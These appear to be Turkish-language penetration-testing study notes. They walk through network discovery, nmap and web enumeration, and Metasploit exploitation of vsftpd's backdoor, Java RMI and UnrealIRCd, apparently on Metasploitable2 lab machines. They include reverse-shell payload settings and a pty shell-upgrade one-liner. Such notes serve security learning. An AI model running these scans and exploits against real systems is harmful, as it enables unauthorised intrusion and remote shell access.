--------------------PenTest----------------------

--------------------Ağdaki makinelerin IP ve OS tespiti----------------------

arp-scan -l //list
nmap -sn 192.168.186.0/24 //subnetdeki diğer IP'lere ping atıyor.
netdiscover -r 192.168.186.0/24 //

crackmapexec smb 192.168.26.0/24 // tüm subnetteki cihazların smb protokolü üzerinden işletim sistemi tespitleri 


--------------------Makine Enumerasyonu----------------------

İp tespit edildikten sonra makine enumerasyonu(bilgi toplaması) çalışan servisler, versiyon bilgileri
nmap -sS -sV -A -T 5 192.168.186.129 -p- // Tüm portlara Stealth syn scan, serviceVersion, Aggressive mode, en hızlı mod= T 5 , -p- tüm portları tarar
		(en hızlı modu gizlilik önemli değilse, anti virus bypass etmemize gerek yoksa kullanıyoruz kendisi otomatik olarak 4 te başlıyo)
			(paketlerimiz olağandışı trafik yapmasın yakalanmayalım istiyosak nmap -h yada man nmap diyoruz, orda komutları var)
sadece tek bir porta veya portlara 

nmap -sS -sV -A -T 5 192.168.186.129 -p 21,22,80 -oA /root/Desktop/fullscan // -oA parametresi sonuçları kaydetmek istiyorsak txt,xml dosyalarına yazdırıyo


--------------------Web Sayfası Zafiyetlerini Bulma Enumerasyonu----------------------

nikto -h http://192.168.186.129

Directory Busting // Web sayfasındaki gizli dizinleri login panellerini ortaya çıkarmak için 

dirb http://10.10.124.181
dirb http://10.10.124.181 -w /usr/share/wordlists/dirb/big.txt // eğer wordlist vermek istiyorsak, genelde vermediğimiz zaman yeterli

Dirbe eşdeğer programlar:
Gobuster 
Dirbuster // (grafik arayüzü var)
Ffuf

Eğer webte wordpress var ise 
wpscan --url http://192.168.1.141 --enumerate a // plugin user password themes bilgileri çıkartır daha fazlası için wpscan --help


--------------------Zafiyetler Hakkında Bilgi Toplama----------------------
Msfconsole
Searchsploit
Google
Rapid7
NIST


--------------------Zafiyetleri Sömürme----------------------

MSFCONSOLE A GİRİŞ
msfdb init // msf databaseini başlatır
msfconsole //

--------FTP Zafiyetini Sömürme--------
search vsftpd
use 1 /// solda yazar exploitin numarası, backdoor, command execution filan varsa güzel, metasploitable2 de vsftpd backdoor command execution vardı
show options // exploitin seçeneklerini sunar, show targets da targetları görür ve seçeriz
set RHOSTS 192.168.5.141 //  Bu kısımlar optionsta gözüktüğü gibi ama harf hassasiyeti var
set TARGET 0
show payloads // Exploitimize hazırladığımız zemin, staged ve stageless olarak ikiye ayrılıyo 
		// örnek olarak windows/meterpreter_reverse_tcp = stageless payload yani bütün shellcode u tek bi anda gönderiyo dezavantajı çalışmaya bilir
		// windows/meterpreter/reverse_tcp = staged payload , her şeyi bi anda göndermiyo , dezavantajı bağlantı sağlıklı olmayabilir düzensiz olup kopabilir

set payload 0 
exploit // exploiti başlatır aynı zamanda run yazarsak da başlar


python -c 'import pty; pty.spawn("/bin/bash")' //interaktif shell'e geçme




--------JAVA RMI Sömürme--------


1099. port = Java Rmi --- Java sunucularındaki arkada kimlik doğrulaması var mı yok mu kontrol, yoksa remote code execution 


msfconsole


search java jmx

use 7 --- java rmi ----- exploit/multi/misc/java_rmi_server

set RHOSTS 192.168.26.137




--------------Unrealircd Sömürme---------------------

6667. unrealircd ------ zafiyetli servis 



search unrealircd

use 0

show options 

set RHOSTS 192.168.26.137 -- metasploit

show payloads 

set payload 6 ----- payload/cmd/unix/reverse 


set LHOST eth0



